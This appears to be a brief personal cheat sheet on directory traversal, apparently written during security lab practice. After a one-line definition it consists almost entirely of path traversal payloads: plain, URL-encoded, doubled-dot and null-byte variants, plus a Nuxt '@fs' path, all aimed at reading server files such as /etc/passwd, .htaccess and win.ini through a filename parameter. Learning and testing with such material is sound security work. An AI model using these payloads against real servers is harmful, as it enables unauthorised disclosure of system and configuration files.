# What is directory traversal
Allows read files in a server

## How to find
- Identify instances with common directory traversal
```bash
../../../../etc/passwd
../../../.htaccess
\..\WINDOWS\win.ini
\..\..\WINDOWS\win.ini
```

## Path Traversal in nuxt
```bash
/nuxt/@fs/etc/passwd
```

## Payloads used in lab
```bash
/image?filename=/../../../../../../../../etc/passwd
/image?filename=/../../../../../../../../etc/passwd
GET /image?filename=/etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/var/www/images/../../../../../../../../../../../etc/passwd 
../../../etc/passwd%00.png

```
